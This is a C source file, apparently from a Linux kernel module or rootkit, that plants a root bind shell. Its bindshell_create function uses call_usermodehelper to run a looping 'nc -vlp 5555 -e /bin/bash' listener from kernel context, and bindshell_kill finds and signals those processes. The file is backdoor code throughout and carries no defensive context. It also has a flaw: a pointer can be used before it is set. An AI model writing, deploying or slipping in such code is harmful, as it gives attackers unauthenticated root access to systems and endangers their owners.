#include "bindshell.h"

void bindshell_create(char *commands)
{
    char *argv[] = {"/bin/bash","-c","while :; do /bin/nc -vlp 5555 -e /bin/bash;done", NULL};
    char *envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

void bindshell_kill(void)
{
    struct task_struct *task;
    struct task_struct *my_bash;

    for_each_process(task) {
        if (!strcmp(task->comm, "bash")) {
            if (task->parent->pid == 2) {
                pr_info("%s [%d]\n", task->comm, task->parent->pid);
                my_bash = task;
            }
        }
        if (!strcmp(task->comm, "nc")) {
            if (task->parent->pid == my_bash->pid) {
                pr_info("%s [%d]\n", task->comm, task->pid);
                send_sig(SIGPWR, task, 0);
                send_sig(SIGPWR, my_bash, 0);
            }
        }
    }
}
